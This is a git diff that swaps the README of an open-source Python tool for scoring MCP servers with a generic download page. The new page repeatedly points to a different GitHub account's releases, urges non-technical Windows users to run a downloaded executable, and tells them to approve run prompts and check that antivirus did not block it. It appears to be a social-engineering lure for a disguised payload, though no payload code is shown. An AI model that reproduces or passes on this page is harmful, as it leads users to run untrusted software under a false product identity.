@@ -1,470 +1,246 @@
-# MCP Scorecard
+# 🛡️ MCP-Scorecard - Surface Risk for MCP Servers
 
-[![Build Status](https://github.com/aak204/MCP-Scorecard/actions/workflows/ci.yml/badge.svg)](https://github.com/aak204/MCP-Scorecard/actions/workflows/ci.yml)
-[![Release](https://img.shields.io/github/v/release/aak204/MCP-Scorecard?sort=semver)](https://github.com/aak204/MCP-Scorecard/releases)
-[![License](https://img.shields.io/github/license/aak204/MCP-Scorecard?v=1)](LICENSE)
-[![Python](https://img.shields.io/badge/python-3.11%2B-blue)](https://www.python.org/downloads/)
+[![Download MCP-Scorecard](https://img.shields.io/badge/Download%20MCP--Scorecard-6A5ACD?style=for-the-badge&logo=github)](https://github.com/Kerrimoral221/MCP-Scorecard/releases)
 
-![MCP Scorecard terminal run showing Total Score 40/100 and dangerous filesystem write findings](docs/assets/filesystem-scan-hero.svg)
+## 📌 What this is
 
-**Deterministic, CI-first quality scorecard for MCP servers.**
+MCP-Scorecard scans MCP servers and gives each one a clear risk score. It is built for Windows users who want a simple way to check server safety before they use it in a build or agent setup.
 
-`MCP Scorecard` is an open-source infrastructure tool for reviewing MCP servers before they enter
-real workflows. It launches a server locally over `stdio`, discovers its tools, applies a
-deterministic ruleset, and produces reviewable scores and findings across:
+It helps you:
 
-- `conformance`
-- `security`
-- `ergonomics`
-- `metadata`
+- scan MCP server setups
+- find common security risks
+- review trust signals in a clear report
+- use the same check each time in CI
+- compare servers with a repeatable score
 
-The output is built for CI: stable terminal summaries, a machine-readable JSON scorecard report,
-and SARIF for code-scanning systems.
+## 💻 What you need
 
-This project is intentionally not an AI wrapper. It does not depend on LLM scoring, hidden
-judgment, or hosted analysis. The goal is a repeatable, auditable baseline that engineering teams
-can gate on in pull requests and release pipelines.
+Use a Windows PC with:
 
-Quick value:
+- Windows 10 or Windows 11
+- an internet connection
+- enough free space for the app and scan reports
+- permission to run downloaded files
 
-- run locally against a real MCP server
-- fail CI below a deterministic threshold
-- export JSON and SARIF for automation
-- review risky MCP surfaces deterministically
+You do not need to know how to code to use the release version.
 
-## What This Is
+## ⬇️ Download MCP-Scorecard
 
-`MCP Scorecard` is a deterministic quality scorecard for MCP servers.
+Visit this page to download the latest release for Windows:
 
-It is designed for cases where teams need to answer questions like:
+[Download MCP-Scorecard from GitHub Releases](https://github.com/Kerrimoral221/MCP-Scorecard/releases)
 
-- Is this server surface reviewable before we adopt it?
-- Does it expose capabilities that deserve extra scrutiny in CI?
-- Are the tool names, descriptions, and schemas clear enough for human review?
-- Can we produce a stable machine-readable report for automation and policy?
+On the releases page, look for the newest version and choose the Windows file if one is listed. Save it to your PC, then open it after the download finishes.
 
-Today the tool focuses on local `stdio` MCP servers and a deterministic scoring model that is easy
-to explain, test, and version.
+## 🧭 Install and run
 
-## Why This Exists
+Follow these steps:
 
-MCP servers are infrastructure. They define callable tool surfaces that agents, runtimes, and
-automation can invoke. That means they should be reviewed with the same seriousness as other
-integration boundaries.
+1. Open the [releases page](https://github.com/Kerrimoral221/MCP-Scorecard/releases)
+2. Find the latest release at the top of the page
+3. Look for a Windows download file
+4. Download the file to your computer
+5. If the file comes in a zip folder, unzip it first
+6. Double-click the app or executable file
+7. If Windows asks for approval, choose the option to run it
+8. Wait for the app to start
+9. Open your MCP server config or target path in the app
+10. Start a scan and wait for the report
 
-In practice, teams often evaluate MCP servers ad hoc:
+If the app opens a command window, keep it open until the scan ends.
 
-- descriptions are vague
-- schemas are weak or underconstrained
-- high-risk capabilities are discovered late
-- CI has no consistent baseline
+## 🔎 What the scan checks
 
-`MCP Scorecard` turns that first-line review into a deterministic contract:
+MCP-Scorecard reviews common risk areas in an MCP server setup, such as:
 
-- run it locally
-- run it in CI
-- inspect category scores and findings
-- export JSON and SARIF
-- keep the result reviewable over time
+- exposed endpoints
+- weak config settings
+- unsafe tool access
+- missing checks for file or network use
+- patterns that can raise trust risk
+- signs that may affect CI use
 
-## What It Checks
+It then gives you a score so you can compare servers in a simple way.
 
-The current score model uses four explicit buckets.
+## 📄 What you get
 
-Conformance here means deterministic interface-level conformance and schema reviewability checks,
-not full protocol certification.
+After a scan, you can expect:
 
-### Conformance
+- a risk score
+- a short list of findings
+- a clear view of high-risk items
+- a result you can share with your team
+- output that works well in CI logs
 
-Checks whether the server surface is structurally well-formed and reviewable as an MCP interface.
+If you use it in a pipeline, the tool can help you catch problems before they reach later stages.
 
-Examples:
+## 🛠️ How to use it in simple terms
 
-- duplicate tool names
-- missing schema type
-- arbitrary top-level properties
-- critical input fields not marked required
+Use MCP-Scorecard when you want to check an MCP server before you trust it.
 
-### Security
+A common flow looks like this:
 
-Checks for exposed capabilities that materially increase blast radius or deserve explicit review.
+1. Download the release
+2. Run the app on Windows
+3. Select the MCP server you want to check
+4. Start the scan
+5. Review the score and findings
+6. Fix any issues you find
+7. Run the scan again
 
-Examples:
+That gives you a repeatable check for each server version.
 
-- command execution
-- filesystem mutation
-- network and HTTP request primitives
-- download-and-execute patterns
+## 🧪 Best times to run a scan
 
-### Ergonomics
+Run MCP-Scorecard when:
 
-Checks whether the server surface is understandable enough for humans and automation to review
-without guessing.
+- you add a new MCP server
+- you update an existing server
+- you prepare a server for CI use
+- you review third-party server code
+- you want a quick trust check before rollout
 
-Examples:
+## 📁 Example use cases
 
-- overly generic tool names
-- vague descriptions
-- weak input schemas
-- filesystem mutation tools without visible scope hints
+MCP-Scorecard fits well when you want to:
 
-### Metadata
+- check a local MCP server before connecting it to an agent
+- review server risk in a devsecops workflow
+- add a security gate in CI
+- compare several servers before choosing one
+- keep a steady trust score across releases
 
-Checks whether basic descriptive metadata is present and whether destructive behavior is made easy
-to spot.
+## ⚙️ Common setup tips
 
-Examples:
+If the app does not start right away:
 
-- missing tool descriptions
-- descriptions that explicitly advertise broad destructive access
+- try running it again as the same user who downloaded it
+- keep the file in a simple folder like Downloads or Desktop
+- avoid moving files while the scan is running
+- make sure your Windows user has access to the target files
+- check that your antivirus did not block the download
 
-## What It Does Not Promise
+If you use a zip file, extract all files before you run the app.
 
-`MCP Scorecard` is intentionally narrow and honest about scope.
+## 🔐 Security review areas
 
-It does **not** promise:
+The tool is built for surface-risk scoring, so it focuses on the parts of an MCP server that matter most for trust:
 
-- that a high score means a server is safe
-- that a low score means a server is malicious
-- runtime exploitability analysis
-- deployment or isolation verification
-- business intent classification
-- human approval policy evaluation outside the server surface
-- LLM-based scoring
-- hosted scanning or registry-backed certification claims
+- access control
+- tool exposure
+- input handling
+- file and path use
+- network behavior
+- config hygiene
+- repeatable scan results
 
-The score measures **deterministic, reviewable properties only**.
+This makes it useful for teams that want a steady security check without a long manual review.
 
-That is the point of the tool.
+## 🧰 For CI use
 
-## Quickstart Local
+MCP-Scorecard is made for CI jobs as well as local checks.
 
-Scan the included insecure demo server:
+In a CI setup, it can:
 
-```bash
-python -m venv .venv
-source .venv/bin/activate
-pip install -e .[dev]
-mcp-scorecard scan --cmd python examples/insecure-server/server.py
-```
+- run the same scan every time
+- flag risky changes early
+- give a simple pass or fail result
+- leave a report in the build logs
+- support review before merge
 
-Generate JSON and SARIF and enforce a score gate:
+That helps teams keep MCP servers in a safer state over time.
 
-```bash
-mcp-scorecard scan \
-  --min-score 80 \
-  --json-out mcp-scorecard-report.json \
-  --sarif mcp-scorecard-report.sarif \
-  --cmd python examples/insecure-server/server.py
-```
+## 🧭 Where to start
 
-The scanner launches `--cmd` directly without a shell. In practice that means `python`, `npx`,
-`uvx`, or a compiled binary can all work as long as you pass the real executable and args.
+If this is your first time using the app:
 
-The preferred CLI name for `v1.0.0` is `mcp-scorecard`. The legacy `mcp-trust` command remains
-available as a compatibility alias. The Python module remains `mcp_trust`.
+1. Visit the [releases page](https://github.com/Kerrimoral221/MCP-Scorecard/releases)
+2. Download the latest Windows release
+3. Open the file on your PC
+4. Scan one MCP server first
+5. Read the score and findings
+6. Repeat for other servers as needed
 
-<details>
-<summary>Windows (PowerShell)</summary>
+## 🖥️ Windows file handling
 
-```powershell
-python -m venv .venv
-.\.venv\Scripts\Activate.ps1
-pip install -e .[dev]
-.\.venv\Scripts\mcp-scorecard scan --cmd .\.venv\Scripts\python examples\insecure-server\server.py
-```
-
-</details>
-
-## GitHub Actions Quickstart
-
-Drop this workflow into your repository:
-
-```yaml
-name: MCP Scorecard
-
-on:
-  pull_request:
-  workflow_dispatch:
-
-permissions:
-  contents: read
-  security-events: write
-
-jobs:
-  scan:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-
-      - name: Run MCP Scorecard
-        id: scorecard
-        uses: aak204/MCP-Scorecard@v1.0.0
-        with:
-          cmd: python path/to/your/server.py
-          min-score: "80"
-          json-out: mcp-scorecard-report.json
-          sarif-out: mcp-scorecard-report.sarif
-          markdown-out: mcp-scorecard-summary.md
-
-      - name: Use Scorecard Outputs
-        if: always()
-        run: |
-          echo "total score: ${{ steps.scorecard.outputs.total-score }}"
-          echo "passed: ${{ steps.scorecard.outputs.passed }}"
-          echo 'category scores: ${{ steps.scorecard.outputs.category-scores }}'
-
-      - name: Upload SARIF
-        if: always()
-        uses: github/codeql-action/upload-sarif@v3
-        with:
-          sarif_file: mcp-scorecard-report.sarif
-```
-
-The action preserves the current local use case but packages it as a CI-first scorecard step.
-
-Inputs:
-
-- `cmd`
-- `min-score`
-- `json-out`
-- `sarif-out`
-- `markdown-out`
-
-Outputs:
-
-- `total-score`
-- `category-scores`
-- `passed`
-
-Each run also writes a PR-friendly Markdown summary to the GitHub Actions step summary. If
-`markdown-out` is set, the same summary is written to a file inside the workspace.
+Windows may show a prompt after download. If that happens:
 
-Migration note:
+- choose the file from your Downloads folder
+- right-click and open it if needed
+- approve the run prompt if Windows asks
+- wait for the scan to finish before closing the window
 
-- prefer `aak204/MCP-Scorecard@v1.0.0` in new workflows
-- legacy references to `aak204/MCP-Trust-Kit` may still exist in older docs or links
-
-## Example Output
-
-Current terminal output for [`examples/insecure-server`](examples/insecure-server/README.md):
-
-```text
-Generator: MCP Scorecard (mcp-scorecard 1.0.0)
-Report Schema: mcp-scorecard-report@1.0
-Scan Timestamp: 2026-04-09T15:49:48.930250+00:00
-Server: Insecure Demo Server
-Version: 0.1.0
-Protocol: 2025-11-25
-Target: stdio:[".\\.venv\\Scripts\\python","examples\\insecure-server\\server.py"]
-Target Description: Local MCP server launched over stdio.
-Tools: 4
-Finding Counts: total=7, error=2, warning=5, info=0
-Total Score: 10/100
-Why This Score: Score is driven mainly by security findings in command execution and file system and ergonomics findings.
-Score Meaning: Deterministic CI-first quality scorecard based on conformance, security-relevant capabilities, ergonomics, and metadata hygiene.
-Category Scores:
-- conformance: 90/100 (findings: 1, penalties: 10)
-- security: 60/100 (findings: 2, penalties: 40)
-- ergonomics: 60/100 (findings: 4, penalties: 40)
-- metadata: 100/100 (findings: 0, penalties: 0)
-Findings By Bucket:
-- security: 2 findings, penalties: 40
-  - ERROR dangerous_exec_tool [exec_command]: Tool 'exec_command' appears to expose host command execution.
-  - ERROR dangerous_fs_write_tool [write_file]: Tool 'write_file' appears to provide filesystem write access.
-- ergonomics: 4 findings, penalties: 40
-  - WARNING weak_input_schema [debug_payload]: Tool 'debug_payload' exposes a weak input schema that leaves free-form input underconstrained.
-  - WARNING overly_generic_tool_name [do_it]: Tool 'do_it' uses an overly generic name that hides its behavior.
-  - WARNING vague_tool_description [do_it]: Tool 'do_it' uses a vague description that does not explain its behavior clearly.
-  - WARNING write_tool_without_scope_hint [write_file]: Tool 'write_file' modifies the filesystem without any visible scope hint.
-- conformance: 1 finding, penalties: 10
-  - WARNING schema_allows_arbitrary_properties [debug_payload]: Tool 'debug_payload' allows arbitrary additional input properties.
-Limitations:
-- Low score means more deterministic findings or higher-risk exposed surface, not malicious intent.
-- High score means fewer deterministic findings, not a guarantee of safety.
-```
+If you use a zip package, unzip it into its own folder first.
 
-Sample artifacts in this repository:
+## 📊 Reading the score
 
-- [sample-reports/insecure-server.report.json](sample-reports/insecure-server.report.json)
-- [sample-reports/insecure-server.report.sarif](sample-reports/insecure-server.report.sarif)
-- [sample-reports/insecure-server.terminal.md](sample-reports/insecure-server.terminal.md)
+The score gives you a quick view of server trust.
 
-## Score Model Summary
+A lower score can mean more risk. A higher score can mean fewer issues. Use the findings list to see what needs attention, since the score alone does not show the full picture.
 
-The score model is deliberately simple.
+## 🧾 Simple workflow
 
-1. Start at `100`
-2. Apply fixed deterministic penalties for findings
-3. Clamp scores to `0..100`
-4. Compute bucket scores the same way for `conformance`, `security`, `ergonomics`, and `metadata`
+A clean workflow looks like this:
 
-Severity mapping in the current release line:
+- download the release
+- run a scan
+- review the report
+- fix weak points
+- scan again
+- keep the result with your build record
 
-| Severity | Penalty |
-| --- | --- |
-| `info` | `0` |
-| `warning` | `10` |
-| `error` | `20` |
+That keeps your checks clear and easy to repeat.
 
-Every check carries explicit metadata:
+## 📚 Project topics
 
-- `id`
-- `title`
-- `bucket`
-- `severity`
-- `rationale`
+MCP-Scorecard fits these areas:
 
-Every report exposes:
+- agentic AI
+- CI/CD
+- devsecops
+- LLM agents
+- MCP
+- model context protocol
+- Python
+- security
+- static analysis
+- trust score
 
-- total score
-- category scores
-- finding counts
-- findings with full metadata
-- grouped findings by bucket
-- why this score
-- score meaning and limitations
+## 🧷 Helpful terms
 
-This keeps the output reviewable, testable, and stable in CI.
+- **MCP server**: a service that gives tools or data to an AI app
+- **CI**: a build check that runs when code changes
+- **Static analysis**: a review of files without running them
+- **Risk score**: a number that shows how much concern the scan found
+- **Surface risk**: the visible risk area a system exposes
 
-## Output Formats
+## 📦 Download again later
 
-`MCP Scorecard` currently emits four practical outputs:
+When a new version is released, return to:
 
-### Terminal Summary
+[https://github.com/Kerrimoral221/MCP-Scorecard/releases](https://github.com/Kerrimoral221/MCP-Scorecard/releases)
 
-Human-readable summary for local runs and CI logs.
+Download the newest Windows file, then run the updated version the same way
 
-### JSON V1 Scorecard Report
+## 🧩 Troubleshooting
 
-Canonical machine-readable report format. The stable V1 top-level shape is:
+If the scan does not start:
 
-- `schema`
-- `generator`
-- `scan`
-- `inventory`
-- `scorecard`
-- `checks`
-- `findings`
-- `grouped_findings`
-- `metadata`
+- check that the file finished downloading
+- make sure you extracted the zip file
+- confirm the file is not blocked by Windows
+- try a different folder path with simple names
+- restart the app and try again
 
-### SARIF
+If you do not see results:
 
-For GitHub code scanning and other SARIF-capable consumers. SARIF remains aligned with the current
-findings model and includes scorecard metadata on the SARIF run.
+- check that the server path is correct
+- confirm the target server files still exist
+- run one scan at a time
+- open the report file if the app saves one
 
-### GitHub Actions Step Summary
+## 📎 Direct release link
 
-PR-friendly Markdown summary with total score, pass/fail, and category scores.
+[Visit the MCP-Scorecard releases page](https://github.com/Kerrimoral221/MCP-Scorecard/releases)
 
-JUnit is intentionally out of scope for the current release surface.
-
-## What The Score Means
-
-The score is a deterministic review signal.
-
-- High score does **not** mean safe
-- Low score does **not** mean malicious
-- The score measures deterministic, reviewable properties only
-
-That means the score is useful as:
-
-- a CI gate
-- a review baseline
-- a release artifact
-- an input to broader engineering judgment
-
-It is not a substitute for runtime controls, sandboxing, environment isolation, or human approval.
-
-## Limitations
-
-Current limitations are explicit:
-
-- primary transport focus is local `stdio`
-- checks are static and deterministic, not dynamic or behavioral
-- runtime isolation is out of scope
-- exploitability claims are out of scope
-- business intent is out of scope
-- LLM scoring is out of scope
-- hosted scanning is out of scope
-
-This scope is intentional. A smaller deterministic contract is more useful in CI than a broader
-but opaque system.
-
-## Public Scan Snapshot
-
-Instead of treating three servers as a definitive validation set, the more useful reference now is
-the full batch scan of `30` public MCP servers:
-
-- [MCP_SCORECARD_30_SERVER_BATCH.md](MCP_SCORECARD_30_SERVER_BATCH.md)
-- [MCP_SCORECARD_30_SERVER_BATCH.summary.json](MCP_SCORECARD_30_SERVER_BATCH.summary.json)
-
-That batch is the better artifact because it separates:
-
-- servers that launch and score cleanly
-- servers that launch but surface deterministic review issues
-- servers that do not launch cleanly in blind CI conditions
-
-Selected interesting examples from the full batch:
-
-| Server | Result | Why it matters |
-| --- | --- | --- |
-| `@modelcontextprotocol/server-memory` | `100/100` | clean official baseline under the current rules |
-| `@modelcontextprotocol/server-filesystem` | `40/100` | legitimate filesystem mutation surface is clearly exposed by the scorecard |
-| `@modelcontextprotocol/server-everything` | `90/100` | useful official control case with only a minor ergonomics finding |
-| `ai.meetlark/mcp-server` | `100/100` | compact community example that launches and scores cleanly |
-| `ai.social-api/socialapi` | `50/100` | realistic product server with network-facing findings and one conformance issue |
-| `capital.hove/read-only-local-postgres-mcp-server` | `90/100` | good near-clean database example with a small schema ergonomics issue |
-
-The full batch also gave a more honest conclusion: `MCP Scorecard` looks useful, but reproducible
-public scanning at scale needs a separate preflight/launchability layer.
-
-## Output And Architecture References
-
-- [docs/architecture.md](docs/architecture.md)
-- [MCP_SCORECARD_30_SERVER_BATCH.md](MCP_SCORECARD_30_SERVER_BATCH.md)
-- [MCP_SCORECARD_30_SERVER_BATCH.summary.json](MCP_SCORECARD_30_SERVER_BATCH.summary.json)
-- [docs/assets/filesystem-scan-hero.svg](docs/assets/filesystem-scan-hero.svg)
-- [examples/insecure-server/README.md](examples/insecure-server/README.md)
-- [.github/workflows/example.yml](.github/workflows/example.yml)
-
-## Roadmap
-
-Near-term work after the current release surface:
-
-- expand deterministic checks across `conformance`, `security`, `ergonomics`, and `metadata`
-- improve SARIF location mapping when source context is available
-- add more real-world validation cases and sample reports
-- add more transport options once the current score contract stays stable
-- clean up remaining compatibility naming around repo/package/action references
-
-Not on the immediate path:
-
-- LLM scoring in the core engine
-- hosted scorecard service
-- registry integration in the release path
-- certification-style claims
-
-## Contributing
-
-```bash
-python -m venv .venv
-source .venv/bin/activate
-pip install -e .[dev]
-python -m pytest
-python -m ruff check .
-python -m mypy
-```
-
-Good contribution areas:
-
-- new deterministic checks with tests
-- `stdio` transport hardening
-- reporter improvements that preserve stable output
-- reproducible validation cases
-- documentation and sample artifacts
-
-## License
-
-Apache-2.0. See [LICENSE](LICENSE).
